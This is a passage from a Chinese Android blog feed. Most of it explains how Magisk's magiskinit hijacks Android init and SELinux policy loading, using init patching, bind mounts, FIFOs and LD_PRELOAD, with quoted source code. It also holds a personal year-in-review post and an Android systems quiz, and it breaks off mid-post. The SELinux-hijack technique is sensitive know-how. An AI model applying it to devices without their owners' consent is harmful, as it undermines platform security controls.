__FUNCTION__); &#125;; void start() override &#123; bool is_rootfs = prepare(); if (is_rootfs) patch_rw_root(); else patch_ro_root(); exec_init(); &#125;&#125;;FirstStageInit 的 prepare 非常简单：123456789101112#define INIT_PATH &quot;&#x2F;system&#x2F;bin&#x2F;init&quot;#define REDIR_PATH &quot;&#x2F;data&#x2F;magiskinit&quot;void FirstStageInit::prepare() &#123; prepare_data(); restore_ramdisk_init(); auto init &#x3D; mmap_data(&quot;&#x2F;init&quot;, true); &#x2F;&#x2F; Redirect original init to magiskinit for (size_t off : init.patch(INIT_PATH, REDIR_PATH)) &#123; LOGD(&quot;Patch @ %08zX [&quot; INIT_PATH &quot;] -&gt; [&quot; REDIR_PATH &quot;]\\n&quot;, off); &#125;&#125;这个函数做了什么呢？首先，prepare_data() 给 /data 挂上了 tmpfs，释放文件到 /data，把 magiskinit 复制到 /data/magiskinit；接着将原本 init 里的 /system/bin/init patch 成了 /data/magiskinit。为什么可以这样做呢？还是得看回上面的特性。我们知道，switch root 前的 mount 会保留到 switch root 之后，所以可以用这种方法保留某些东西；但是，mount 要求目标文件（夹）必须存在，而 /system 并不可写，所以自己 mkdir 一个文件夹，mount tmpfs 然后指望 init 帮我们 move mount 的做法行不通。为了保留某些东西，我们必须选一个 init first stage 到 selinux_setup 期间都不会被使用到的文件夹来帮我们放东西，而 magisk 选择的是 /data。这让 patch init 使得 init 执行 /system/bin/init 进行 selinux_setup 时转为执行 magiskinit。第二阶段的代码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798bool SecondStageInit::prepare() &#123; /** 这一行 unmount 是给 Legacy SAR with 2SI 使用的 **/ umount2(\"/init\", MNT_DETACH); unlink(\"/data/init\"); // Make sure init dmesg logs won't get messed up argv[0] = (char *) INIT_PATH; // Some weird devices like meizu, uses 2SI but still have legacy rootfs struct statfs sfs&#123;&#125;; statfs(\"/\", &amp;sfs); /** 魅族设备的 2SI 不会 switch root，所以依然在 rootfs，需要判断这种特殊情况 **/ if (sfs.f_type == RAMFS_MAGIC || sfs.f_type == TMPFS_MAGIC) &#123; // We are still on rootfs, so make sure we will execute the init of the 2nd stage unlink(\"/init\"); xsymlink(INIT_PATH, \"/init\"); return true; &#125; return false;&#125;#define ROOTMIR MIRRDIR \"/system_root\"#define NEW_INITRC_DIR \"/system/etc/init/hw\"void MagiskInit::patch_ro_root() &#123; mount_list.emplace_back(\"/data\"); parse_config_file(); /** Android 11+ sbin 可能不存在，使用 /debug_ramdisk 代替 **/ string tmp_dir; if (access(\"/sbin\", F_OK) == 0) &#123; tmp_dir = \"/sbin\"; &#125; else &#123; tmp_dir = \"/debug_ramdisk\"; xmkdir(\"/data/debug_ramdisk\", 0); xmount(\"/debug_ramdisk\", \"/data/debug_ramdisk\", nullptr, MS_MOVE, nullptr); &#125; /** 初始化 magisk internal tmpfs **/ setup_tmp(tmp_dir.data()); chdir(tmp_dir.data()); if (tmp_dir == \"/sbin\") &#123; // Recreate original sbin structure xmkdir(ROOTMIR, 0755); xmount(\"/\", ROOTMIR, nullptr, MS_BIND, nullptr); recreate_sbin(ROOTMIR \"/sbin\", true); xumount2(ROOTMIR, MNT_DETACH); &#125; else &#123; // Restore debug_ramdisk xmount(\"/data/debug_ramdisk\", \"/debug_ramdisk\", nullptr, MS_MOVE, nullptr); rmdir(\"/data/debug_ramdisk\"); &#125; xrename(\"overlay.d\", ROOTOVL); extern bool avd_hack; // Handle avd hack if (avd_hack) &#123; // Android API 28 AVD 模拟器相关，跳过 &#125; load_overlay_rc(ROOTOVL); if (access(ROOTOVL \"/sbin\", F_OK) == 0) &#123; // Move files in overlay.d/sbin into tmp_dir mv_path(ROOTOVL \"/sbin\", \".\"); &#125; /** 修补 init.rc，注入 magisk 自己的服务 **/ // Patch init.rc if (access(NEW_INITRC_DIR, F_OK) == 0) &#123; // Android 11's new init.rc patch_rc_scripts(NEW_INITRC_DIR, tmp_dir.data(), false); &#125; else &#123; patch_rc_scripts(\"/\", tmp_dir.data(), false); &#125; // Extract magisk extract_files(false); /** 修补 sepolicy，注入我们的规则 **/ // Oculus Go will use a special sepolicy if unlocked if (access(\"/sepolicy.unlocked\", F_OK) == 0) &#123; patch_sepolicy(\"/sepolicy.unlocked\", ROOTOVL \"/sepolicy.unlocked\"); &#125; else if ((access(SPLIT_PLAT_CIL, F_OK) != 0 &amp;&amp; access(\"/sepolicy\", F_OK) == 0) || !hijack_sepolicy()) &#123; patch_sepolicy(\"/sepolicy\", ROOTOVL \"/sepolicy\"); &#125; /** 用 bind mount 将需要修改的文件给一个个 mount 上去，这样就实现了不修改真实分区而修改文件 **/ // Mount rootdir magic_mount(ROOTOVL); int dest = xopen(ROOTMNT, O_WRONLY | O_CREAT, 0); write(dest, magic_mount_list.data(), magic_mount_list.length()); close(dest); chdir(\"/\");&#125;大致逻辑还是差不多的，只不过多了一些不同系统的处理（比如魅族设备需要特殊处理，这里因为 rootfs 仍然可写所以直接走 rootfs 逻辑就好了），还有由于 switch root 后 / 并不可写，所以所有对文件的修改都是先把修改过的文件放在 magisk internal tmpfs 内，然后 bind mount 到它原始的路径。大致流程为：kernel 执行 init，magiskinit 被运行，检测系统环境，判断为 2SI 设备第一阶段，进入 FirstStageInit挂载 /data 为 tmpfs，释放 /data/magiskinit修补原始 init，重定向 /system/bin/init 到 /data/magiskinit，然后执行原始 init原始 init 会挂载 /system 然后 switch root 进去，接下来它执行 /system/bin/init（被我们 patch 了所以会执行 /data/magiskinit）进行 selinux_setupmagiskinit 被再次执行，看见 selinux_setup 知道这是二阶段，switch root 已经完成，开始 patch_ro_root()修补 init.rc，注入我们的代码修补 sepolicy，注入我们的规则（细节后面再谈）利用 bind mount 替换 所有需要修改的文件执行系统原来的 init，继续开机流程init 会解析并执行 init.rc，运行 magiskLegacy SAR终于讲到 Legacy SAR 这个坑人的玩意了。。。这玩意坑人的地方在于：boot.img 内 ramdisk 正常情况不会用到，magiskinit 根本没机会执行。对于 A/B 设备，boot 里放着的是 recovery ramdisk，bootloader 通过向内核传递 skip_initramfs 来让内核知道该不该挂载 initramfs。Magisk 的解决办法是，安装的时候 patch 一下内核，把 skip_initramfs patch 成别的东西这样内核就认不出来 bootloader 传的是什么了，然后就会乖乖的挂载 initramfs。但对于 A-only 设备，boot.img 里根本没有 ramdisk，就算手动加一个 ramdisk，bootloader 也很有可能并不识别它，根本没办法插一脚。Magisk 表示臣妾无能为力，patch recovery.img 然后每次都重启到 recovery 用吧，要不然我也插不进去啊~即使我们成功把 init 偷梁换柱成了 magiskinit，/ 也是 system.img，写不了，很难干活。来看看 magiskinit 的代码吧：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102/************* * Legacy SAR *************/class LegacySARInit : public MagiskInit &#123;private: bool mount_system_root(); void first_stage_prep();public: LegacySARInit(char *argv[], BootConfig *config) : MagiskInit(argv, config) &#123; LOGD(\"%s\\n\", __FUNCTION__); &#125;; void start() override &#123; prepare_data(); bool is_two_stage = mount_system_root(); if (is_two_stage) first_stage_prep(); else patch_ro_root(); exec_init(); &#125;&#125;;bool LegacySARInit::mount_system_root() &#123; LOGD(\"Mounting system_root\\n\"); // there's no /dev in stub cpio xmkdir(\"/dev\", 0777); strcpy(blk_info.block_dev, \"/dev/root\"); do &#123; // Try legacy SAR dm-verity strcpy(blk_info.partname, \"vroot\"); auto dev = setup_block(); if (dev &gt; 0) goto mount_root; // Try NVIDIA naming scheme strcpy(blk_info.partname, \"APP\"); dev = setup_block(); if (dev &gt; 0) goto mount_root; sprintf(blk_info.partname, \"system%s\", config-&gt;slot); dev = setup_block(); if (dev &gt; 0) goto mount_root; // Poll forever if rootwait was given in cmdline &#125; while (config-&gt;rootwait); // We don't really know what to do at this point... LOGE(\"Cannot find root partition, abort\\n\"); exit(1);mount_root: xmkdir(\"/system_root\", 0755); if (xmount(\"/dev/root\", \"/system_root\", \"ext4\", MS_RDONLY, nullptr)) &#123; if (xmount(\"/dev/root\", \"/system_root\", \"erofs\", MS_RDONLY, nullptr)) &#123; // We don't really know what to do at this point... LOGE(\"Cannot mount root partition, abort\\n\"); exit(1); &#125; &#125; switch_root(\"/system_root\"); // Make dev writable xmount(\"tmpfs\", \"/dev\", \"tmpfs\", 0, \"mode=755\"); mount_list.emplace_back(\"/dev\"); // Use the apex folder to determine whether 2SI (Android 10+) bool is_two_stage = access(\"/apex\", F_OK) == 0; LOGD(\"is_two_stage: [%d]\\n\", is_two_stage); // For API 28 AVD, it uses legacy SAR setup that requires // special hacks in magiskinit to work properly. if (!is_two_stage &amp;&amp; config-&gt;emulator) &#123; // AVD，不重要 &#125; return is_two_stage;&#125;void LegacySARInit::first_stage_prep() &#123; // Patch init binary int src = xopen(\"/init\", O_RDONLY); int dest = xopen(\"/data/init\", O_CREAT | O_WRONLY, 0); &#123; mmap_data init(\"/init\"); for (size_t off : init.patch(INIT_PATH, REDIR_PATH)) &#123; LOGD(\"Patch @ %08zX [\" INIT_PATH \"] -&gt; [\" REDIR_PATH \"]\\n\", off); &#125; write(dest, init.buf(), init.sz()); fclone_attr(src, dest); close(dest); close(src); &#125; xmount(\"/data/init\", \"/init\", nullptr, MS_BIND, nullptr);&#125;总结如下：magiskinit 被运行，检测系统环境，判断为 Legacy SAR，进入 LegacySARInit因为 kernel 被我们 patch 了，原本 switch root 应该由 kernel 来做的，现在没有了，需要手动 mount /system 然后 switch root 进去检测有没有 /apex，有的话代表 Android 10+，init 有 selinux_setup 阶段，可以劫持，走 first_stage_prep()；没有的话直接 patch_ro_boot() 然后执行原来的 initfirst_stage_prep() 里会像 Modern 2SI 那样修补 init，将 /system/bin/init 重定向到 /data/magiskinit，然后把它挂载到 /init 以供后面执行；执行原来的 init。原来的 init 执行 selinux_setup（若有），转到 magiskinit，magiskinit 识别到二阶段，自动 patch_ro_boot()patch_ro_boot() 完成之后，执行 init 交还控制权，继续开机修补 SEPolicy由于这一块过于复杂，所以单独放一节讲。如果你仔细看了上面的代码，你会发现修补 SEPolicy 有 patch_sepolicy() 以及 hijack_sepolicy() 两个函数，那么它们有什么不同呢？123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128void MagiskInit::patch_sepolicy(const char *in, const char *out) &#123; LOGD(\"Patching monolithic policy\\n\"); auto sepol = unique_ptr&lt;sepolicy&gt;(sepolicy::from_file(in)); /** 修补 sepolicy **/ sepol-&gt;magisk_rules(); LOGD(\"Dumping sepolicy to: [%s]\\n\", out); sepol-&gt;to_file(out); // Remove OnePlus stupid debug sepolicy and use our own if (access(\"/sepolicy_debug\", F_OK) == 0) &#123; unlink(\"/sepolicy_debug\"); link(\"/sepolicy\", \"/sepolicy_debug\"); &#125;&#125;#define MOCK_COMPAT SELINUXMOCK \"/compatible\"#define MOCK_LOAD SELINUXMOCK \"/load\"#define MOCK_ENFORCE SELINUXMOCK \"/enforce\"bool MagiskInit::hijack_sepolicy() &#123; xmkdir(SELINUXMOCK, 0); if (access(\"/system/bin/init\", F_OK) == 0) &#123; // On 2SI devices, the 2nd stage init file is always a dynamic executable. // This meant that instead of going through convoluted methods trying to alter // and block init's control flow, we can just LD_PRELOAD and replace the // security_load_policy function with our own implementation. dump_preload(); setenv(\"LD_PRELOAD\", \"/dev/preload.so\", 1); &#125; // Hijack the \"load\" and \"enforce\" node in selinuxfs to manipulate // the actual sepolicy being loaded into the kernel auto hijack = [&amp;] &#123; LOGD(\"Hijack [\" SELINUX_LOAD \"]\\n\"); close(xopen(MOCK_LOAD, O_CREAT | O_RDONLY, 0600)); xmount(MOCK_LOAD, SELINUX_LOAD, nullptr, MS_BIND, nullptr); LOGD(\"Hijack [\" SELINUX_ENFORCE \"]\\n\"); mkfifo(MOCK_ENFORCE, 0644); xmount(MOCK_ENFORCE, SELINUX_ENFORCE, nullptr, MS_BIND, nullptr); &#125;; string dt_compat; if (access(SELINUX_ENFORCE, F_OK) != 0) &#123; // selinuxfs not mounted yet. Hijack the dt fstab nodes first // and let the original init mount selinuxfs for us. // This only happens on Android 8.0 - 9.0 char buf[4096]; ssprintf(buf, sizeof(buf), \"%s/fstab/compatible\", config-&gt;dt_dir); dt_compat = full_read(buf); if (dt_compat.empty()) &#123; // Device does not do early mount and uses monolithic policy return false; &#125; // Remount procfs with proper options xmount(nullptr, \"/proc\", nullptr, MS_REMOUNT, \"hidepid=2,gid=3009\"); LOGD(\"Hijack [%s]\\n\", buf); // Preserve sysfs and procfs for hijacking mount_list.erase(std::remove_if( mount_list.begin(), mount_list.end(), [](const string &amp;s) &#123; return s == \"/proc\" || s == \"/sys\"; &#125;), mount_list.end()); mkfifo(MOCK_COMPAT, 0444); xmount(MOCK_COMPAT, buf, nullptr, MS_BIND, nullptr); &#125; else &#123; hijack(); &#125; // Create a new process waiting for init operations if (xfork()) &#123; // In parent, return and continue boot process return true; &#125; if (!dt_compat.empty()) &#123; // This open will block until init calls DoFirstStageMount // The only purpose here is actually to wait for init to mount selinuxfs for us int fd = xopen(MOCK_COMPAT, O_WRONLY); char buf[4096]; ssprintf(buf, sizeof(buf), \"%s/fstab/compatible\", config-&gt;dt_dir); xumount2(buf, MNT_DETACH); hijack(); xwrite(fd, dt_compat.data(), dt_compat.size()); close(fd); &#125; // This open will block until init calls security_getenforce int fd = xopen(MOCK_ENFORCE, O_WRONLY); // Cleanup the hijacks umount2(\"/init\", MNT_DETACH); xumount2(SELINUX_LOAD, MNT_DETACH); xumount2(SELINUX_ENFORCE, MNT_DETACH); // Load and patch policy auto sepol = unique_ptr&lt;sepolicy&gt;(sepolicy::from_file(MOCK_LOAD)); sepol-&gt;magisk_rules(); sepol-&gt;load_rules(rules); // Load patched policy into kernel sepol-&gt;to_file(SELINUX_LOAD); // Write to the enforce node ONLY after sepolicy is loaded. We need to make sure // the actual init process is blocked until sepolicy is loaded, or else // restorecon will fail and re-exec won't change context, causing boot failure. // We (ab)use the fact that init reads the enforce node, and because // it has been replaced with our FIFO file, init will block until we // write something into the pipe, effectively hijacking its control flow. string enforce = full_read(SELINUX_ENFORCE); xwrite(fd, enforce.data(), enforce.length()); close(fd); // At this point, the init process will be unblocked // and continue on with restorecon + re-exec. // Terminate process exit(0);&#125;最直观的感觉就是，两个函数代码量不一样……Android 上，sepolicy 可以以单个的 sepolicy 文件的形式存储，也可以存储多个拆分的 cil 文件；前者被称为 monolithic policy，后者被称为 split sepolicy。Linux 内核只接受 monolithic policy，所以加载 split sepolicy 时，由 init 进程负责将 cil 文件编译为 monolithic policy 并加载进内核。对于 monolithic policy，magiskinit patch 起来非常轻松惬意：直接加载 /sepolicy，修改，放回去，然后 init 加载的时候就会加载我们修改过的 sepolicy。而对于 split policy 可就麻烦了，init 运行之前可能根本没有 /sepolicy 给你 patch，怎么办呢？因为 init 会把 cil 全部编译成 monolithic policy 然后再传进内核里（具体是往 /sys/fs/selinux/load 写入），要是有方法拦截这个写入过程就好了！有吗？还真有。先快速介绍一下 FIFO 的概念：FIFO 看起来就像一个普通的文件，但是它用起来类似 pipe，就是一根管子，当一个进程往里写内容的时候，另一个进程能读取到。反过来，一个进程读它的时候，默认会阻塞，直到有另外的进程打开了这个 FIFO 并且写入内容。说白了就是一个专门用来进程间通信的管子，只不过长得是个文件而已。Magisk 的 hijack_policy() 正是利用了 FIFO 的特性，才能拦截到 init 加载 sepolicy 的过程。具体来说，大致分为以下几步：判断 selinuxfs 有没有被挂载，如果没有需要先等 init 挂载 selinuxfs。这里我们同样利用 FIFO，选择了一个 init 挂载完 selinuxfs 之后会读取的文件，来卡住时机。里面的注释 This only happens on Android 8.0 - 9.0 其实是因为更旧的版本没有 split policy，直接 patch monolithic policy 就好了，不用走 hijack；而 Android 10+ init 始终分为三步，我们永远在 selinux_setup 时进行 hijack，此时 first stage 已经走完了，selinuxfs 肯定已经被 init mount 上了；只有 Android 8.0-9.0，有可能有 split policy 又没有单独的 selinux_setup 这一步可以拦截，所以只能手动进行特殊处理。用 bind mount 把 /sys/fs/selinux/load 覆盖成一个普通的文件，这样 init 往里写入 sepolicy 时其实是写进了我们的文件，而不是内核里调用 mkfifo() 创建一个 FIFO，然后 bind mount 到 /sys/fs/selinux/enforce 上面fork 一个子进程，父进程继续执行剩余步骤，然后执行原始 init；子进程会以 write-only 的方式打开这个 FIFO，此时因为 FIFO 的特性，这个进程会阻塞，直到有另一个进程以 read 方式打开同样的 FIFO。在我们的例子当中，子进程会阻塞，直到 init 调用 security_getenforce() 读取了 /sys/fs/selinux/enforce，此时 init 阻塞，等待我们的子进程往 FIFO 内写入内容，而此时 init 已经把要加载的 sepolicy 写入到了 /sys/fs/selinux/load读取 init 原本要加载的 sepolicy，进行 patch 注入自己的规则，然后手动加载进内核里（因为之前 init 尝试加载的时候被我们给拦了）往 FIFO 写入内容，唤醒对端的 init 进程，做一些 cleanup 然后可以退出子进程。虽然整个 hijack 还使用了 LD_PRELOAD 等技术来保证 sepolicy hijack 能够正常工作，但大致流程就是如上所示。整个机制非常精妙，非常依赖 init 的实际行为，需要结合 android init 及 libselinux 的源码反复琢磨才能搞清其中逻辑。","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"magisk","slug":"magisk","permalink":"https://blog.canyie.top/tags/magisk/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"kernel","slug":"kernel","permalink":"https://blog.canyie.top/tags/kernel/"}]},{"title":"若人生是场大梦啊——记我人生的前19年","slug":"first-19-years-of-my-life","date":"2023-11-06T11:16:26.000Z","updated":"2025-04-24T10:33:02.819Z","comments":true,"path":"2023/11/06/first-19-years-of-my-life/","link":"","permalink":"https://blog.canyie.top/2023/11/06/first-19-years-of-my-life/","excerpt":"上次发年终总结还是 2022 年发 2021 年的，2022 年的年终总结缺失了。今年发生了好多好多的事情，一直想写今年的年终总结但是却总没到年终，干脆写成前 19 年纪念吧。","text":"上次发年终总结还是 2022 年发 2021 年的，2022 年的年终总结缺失了。今年发生了好多好多的事情，一直想写今年的年终总结但是却总没到年终，干脆写成前 19 年纪念吧。从中职，到大学2021 年年底，从电子厂回来了，简单过了一个年之后，2022 年初，我的中职学校终于开设了高考班，但令我没想到的是，学校要求高考班学生先进电子厂再实习三个月，九月份再正式开始学。为了逃避实习，只能和学校说要参加竞赛，然后跑去 CSP-J 2022 玩了一圈。九月份后，进入高三（我不管我不管中职三年级也能叫做高三），实习的同学都回来了，课程再次从零开始重置，挑战了一出三个月学完全部内容。2022 年底，COVID-19 疫情防控政策放开，COVID-19 Omicron 大爆发，临近考试的时刻被学校全部遣送回家，然后体验了新冠一周速通（不得不说是真他妈难受啊）。幸好，高职高考宣布延期（不延期我就要当场死掉了！！！），在家玩了最长的一个寒假（除了2020年寒假），2月份就这样上了考场。结果是，367分，一开始看见分数有点失望，但是不知道是今年试题比往年偏难还是其他考生经过新冠后都没发挥好，竟然考到了全省四百多名，完全想不到的结果。然后就是填志愿选学校了，面对只有两间还都是民办的本科院校和全省甚至全国最好的专科院校，还是选择了填报本科。到了专业技能测试，结果竟然考了50道选择题，轻松拿下。总之怎么说呢，终于摆脱了中等职业教育，终于和以前的同学们又站在了同一条起跑线。上学好累，真的好累，继续努力吧。我想，做我喜欢的事情我喜欢计算机，我喜欢编程，我喜欢研究奇怪的事情，我喜欢帮助别人。我一直都知道。这两年给 Magisk 提交了好多好多代码，就在 2022 年的最后一天晚上，我还在给 magisk 修 bug。commit, push, create pull request, reply to the initial issue，时钟就这样转到了 23:59 （以 UTC+8 时间）。和另一位维护者说了句新年快乐，就这样，2022 年结束了，新的 2023 年来了。2023 年一月，新的一年的第一个月，拿到了 Magisk 项目的 collaborator 身份，后续又把 canyie 这个名字放进了 magisk app 主页【关注我们】里的开发者列表，算是安慰一下自己吧。高职高考结束之后，选择硬刚学校，自行跑路后联系了以前认识的一个长沙老板，成功加入到了他们公司干了四个月活，是小时候梦寐以求的 Android Framework 开发工程师哦。工作的时候，研究 Android Framework 的时候还意外发现了一个安全漏洞，和 google 反馈之后，google 定级为中危漏洞，本来以为能领到人生中第一个 CVE 的，结果五月份 google 改政策，不给普通的 moderate issue 分配 CVE 了，到手的 CVE 飞了，太坏了。继续努力吧。就这样吧。期待下次相见。","categories":[],"tags":[{"name":"年鉴","slug":"年鉴","permalink":"https://blog.canyie.top/tags/%E5%B9%B4%E9%89%B4/"},{"name":"闲聊","slug":"闲聊","permalink":"https://blog.canyie.top/tags/%E9%97%B2%E8%81%8A/"}]},{"title":"写给 Android 开发者的系统基础知识科普","slug":"system-foundation-for-android-devs","date":"2023-03-28T08:03:06.000Z","updated":"2025-04-24T10:33:02.825Z","comments":true,"path":"2023/03/28/system-foundation-for-android-devs/","link":"","permalink":"https://blog.canyie.top/2023/03/28/system-foundation-for-android-devs/","excerpt":"与我以往的风格不同，本文为科普类文章，因此不会涉及到太过高深难懂的知识。但这些内容可能 Android 应用层开发者甚至部分 framework 层开发者都不了解，因此仍旧高能预警。另外广东这两天好冷啊，大家注意保暖~","text":"与我以往的风格不同，本文为科普类文章，因此不会涉及到太过高深难懂的知识。但这些内容可能 Android 应用层开发者甚至部分 framework 层开发者都不了解，因此仍旧高能预警。另外广东这两天好冷啊，大家注意保暖~虚拟机与运行时对象的概念假设 getObjectAddress(Object) 是一个获取对象内存地址的方法。第一题：考虑如下代码：123456public static void main(String[] args) &#123; Object o = new Object(); long address1 = getObjectAddress(o); // ....... long address2 = getObjectAddress(o);&#125;main 方法中，创建了一个 Object 对象，随后两次调用 getObjectAddress 获取该对象的地址。两次获取到的对象地址是否有可能不同？换句话说，对象的地址是否有可能变更？答：有可能。JVM 中存在 GC 即“垃圾回收”机制，会回收不再使用的对象以腾出内存空间。GC 可能会移动对象。第二题：考虑如下代码：12345678910private static long allocate() &#123; Object o = new Object(); return getObjectAddress(o);&#125;public static void main(String[] args) &#123; long address1 = allocate(); // ...... long address2 = allocate();&#125;allocate() 创建了一个 Object 对象，然后获取它的对象地址。main 方法中调用两次 allocate()，这两个对象的内存地址是否有可能相同？答：有可能。在 allocate() 方法中创建的对象在该方法返回后便失去所有引用成为“不再需要的对象”，如果两次方法调用之间，第一次方法调用中产生的临时对象被上文中提到的 GC 机制回收，对应的内存空间就变得“空闲”，可以被其他对象占用。第三题：哎呀，既然上面说同一个对象的内存地址可能不相同，两个不同对象也有可能有相同的内存地址，而java 里的 == 又是判断对象的内存地址，那么12Object o = new Object();if (o != o)还有123Object o1 = new Object();Object o2 = new Object();if (o1 == o2)这里的两个 if 不是都有可能成立？答：不可能。== 操作符比较的确实是对象地址没错，但是这里其实还隐含了两个条件：这个操作符比较的是 “那一刻” 两个对象的地址。比较的两个对象都位于同一个进程内。上述提到的两种情况都不满足“同一时间”这一条件，因此这两条 if 永远不会成立。类与方法第四题：假设 Framework 是 Android Framework 里的一个类，App 是某个 Android App 的一个类：1234567891011public class Framework &#123; public static int api() &#123; return 0; &#125;&#125;public class App &#123; public static void main(String[] args) &#123; Framework.api(); &#125;&#125;编译 App，然后将 Framework 内 api 方法的返回值类型从 int 改为 long，编译 Framework 但不重新编译 App，App 是否可以正常调用 Framework 的 api 方法？答：不能。Java 类内存储的被调用方法的信息里包含返回值类型，如果返回值类型不对在运行时就找不到对应方法。将方法改为成员变量然后修改该变量的类型也同理。第五题：考虑如下代码：12345678910111213141516class Parent &#123; public void call() &#123; privateMethod(); &#125; private void privateMethod() &#123; System.out.println(\"Parent method called\"); &#125;&#125;class Child extends Parent &#123; private void privateMethod() &#123; System.out.println(\"Child method called\"); &#125;&#125;new Child().call();Child 里的 privateMethod 是否重写了 Parent 里的？call 中调用的 privateMethod() 会调用到 Parent 里的还是 Child 里的？答：不构成方法重写，还是会调用到 Parent 里的 privateMethod。private 方法是 direct 方法，direct 方法无法被重写。操作系统基础多进程与虚拟内存假设有进程 A 和进程 B。第六题：进程 A 里的对象 a 和进程 B 里的对象 b 拥有相同的内存地址，它们是同一个对象吗？答：当然不是，上面才说过“对象相等”这个概念在同一个进程里才有意义，不认真听课思考是会被打屁屁的~第七题：进程 A 内有一个对象 a 并将这个对象的内存地址传递给了 B，B 是否可以直接访问（读取、写入等操作）这个对象？答：不能，大概率会触发段错误，小概率会修改到自己内存空间里某个冤种对象的数据，无论如何都不会影响到进程 A。作为在用户空间运行的进程，它们拿到的所谓内存地址全部都是虚拟地址，进程访问这些地址的时候会先经过一个转换过程转化为物理地址再操作。如果转换出错（人家根本不认识你给的这个地址，或者对应内存的权限不让你执行对应操作），就会触发段错误。第八题：还是我们可爱的进程 A 和 B，但是这次 B 是 A 的子进程，即 A 调用 fork 产生了 B 这个新的进程：1234567891011void a() &#123; int* p = malloc(sizeof(int)); *p = 1; if (fork() &gt; 0) &#123; // 进程 A 也即父进程 // 巴拉巴拉巴拉一堆操作 &#125; else &#123; // 进程 B 也即子进程 *p = 2; &#125;&#125;（fork 是 Posix 内创建进程的 API，调用完成后如果仍然在父进程则返回子进程的 pid 永远大于 0，在子进程则返回 0）（还是理解不了就把 A 想象为 Zygote 进程，B 想象为任意 App 进程）这一段代码分配了一段内存，调用 fork 产生了一个子进程，然后在子进程里将预先分配好的那段内存里的值更改为 2。问：进程 B 做出的更改是否对进程 A 可见？答：不可见，进程 A 看见的那一段内存的值依然是 1。Linux 内核有一个叫做“写时复制”（Copy On Write）的技术，在进程 B 尝试写入这一段内存的时候会偷偷把真实的内存给复制一份，最后写入的是这份拷贝里的值，而进程 A 看见的还是原来的值。跨进程大数据传递已知进程 A 和进程 B，进程 A 暴露出一个 AIDL 接口，现在进程 B 要从 A 获取 10M 的数据（远远超出 binder 数据大小限制），且禁止传递文件路径，只允许调用这个 AIDL 接口一次，请问如何实现？答：可以传递文件描述符（File Descriptor）。别以为这个玩意只能表示文件！举个例子，作为应用层开发者我们可以使用共享内存的方法，这样编写 AIDL 实现类把数据传递出去：12345678910111213141516171819202122@Override public SharedMemory getData() throws RemoteException &#123; int size = 10 * 1024 * 1024; try &#123; SharedMemory sharedMemory = SharedMemory.create(\"shared memory\", size); ByteBuffer buffer = sharedMemory.mapReadWrite(); for (int i = 0;i &lt; 10;i++) &#123; // 模拟产生一堆数据 buffer.put(i * 1024 * 1024, (byte) 114); buffer.put(i * 1024 * 1024 + 1, (byte) 51); buffer.put(i * 1024 * 1024 + 2, (byte) 4); buffer.put(i * 1024 * 1024 + 3, (byte) 191); buffer.put(i * 1024 * 1024 + 4, (byte) 98); buffer.put(i * 1024 * 1024 + 5, (byte) 108); buffer.put(i * 1024 * 1024 + 6, (byte) 93); &#125; SharedMemory.unmap(buffer); sharedMemory.setProtect(OsConstants.PROT_READ); return sharedMemory; &#125; catch (ErrnoException e) &#123; throw new RemoteException(\"remote create shared memory failed: \" + e.getMessage()); &#125;&#125;然后在进程 B 里这样拿：123456789101112131415161718IRemoteService service = IRemoteService.Stub.asInterface(binder);try &#123; SharedMemory sharedMemory = service.getData(); ByteBuffer buffer = sharedMemory.mapReadOnly(); // 模拟处理数据 int[] temp = new int[10]; for (int i = 0;i &lt; 10;i++) &#123; for (int j = 0;j &lt; 10;j++) &#123; temp[j] = buffer.get(i * 1024 * 1024 + j); &#125; Log.e(TAG, \"Large buffer[\" + i + \"]=\" + Arrays.toString(temp)); &#125; SharedMemory.unmap(buffer); sharedMemory.close();&#125; catch (Exception e) &#123; throw new RuntimeException(e);&#125;这里使用的 SharedMemory 从 Android 8.1 开始可用，在 8.1 之前的系统里也有一个叫做 MemoryFile 的 API 可以用。打开 SharedMemory 里的源码，你会发现其实它内部就是创建了一块 ashmem （匿名共享内存），然后将对应的文件描述符传递给 binder。内核会负责将一个可用的文件描述符传递给目标进程。你可以将它理解为可以跨进程传递的 File Stream（只要能通过权限检查），合理利用这个小玩意有奇效哦 ：）","categories":[],"tags":[{"name":"android","slug":"android","permalink":"https://blog.canyie.top/tags/android/"},{"name":"system","slug":"system","permalink":"https://blog.canyie.top/tags/system/"},{"name":"art","slug":"art","permalink":"https://blog.canyie.top/tags/art/"},{"name":"kernel","slug":"kernel","permalink":"https://blog.canyie.top/tags/kernel/"}]},{"title":"Android Property 实现解析与黑魔法","slug":"property-implementation-and-isolation","date":"2022-04-09T09:30:00.000Z","updated":"2025-04-24T10:33:02.823Z","comments":true,"path":"2022/04/09/property-implementation-and-isolation/","link":"","permalink":"https://blog.canyie.top/2022/04/09/property-implementation-and-isolation/","excerpt":"Android Property （属性系统）可谓是 Android 中使用最广泛的进程间信息共享机制了，如 app 获取系统版本号，就是通过属性系统传递的信息；对于如此常用的底层机制，你可能知道 getprop SystemProperties __system_property_get 这些 API，但是，你真的了解它吗？这次，我们不但要会遵守规则用这些 API，我们还要成为规则的缔造者，让系统为我们服务！Let’s go！","text":"Android Property （属性系统）可谓是 Android 中使用最广泛的进程间信息共享机制了，如 app 获取系统版本号，就是通过属性系统传递的信息；对于如此常用的底层机制，你可能知道 getprop SystemProperties __system_property_get 这些 API，但是，你真的了解它吗？这次，我们不但要会遵守规则用这些 API，我们还要成为规则的缔造者，让系统为我们服务！Let’s go！系统实现分析首先，我们有这几个问题需要解答：ro. 开头的属性是只读的，只能被设置一次，系统是怎么实现的？系统里的属性那么多，难免会有一些 app 读取不了的敏感属性，系统是怎么限制我们读取的？Linus 大神有句话很出名：“Read the F*cking Source Code。”想要解答这些问题，阅读源码是必须的。Property Context我们通常使用 __system_properties_get 这个 API 去获取系统属性，点开这个函数看看：12345678910111213141516static SystemProperties system_properties;__BIONIC_WEAK_FOR_NATIVE_BRIDGEint __system_property_get(const char* name, char* value) &#123; return 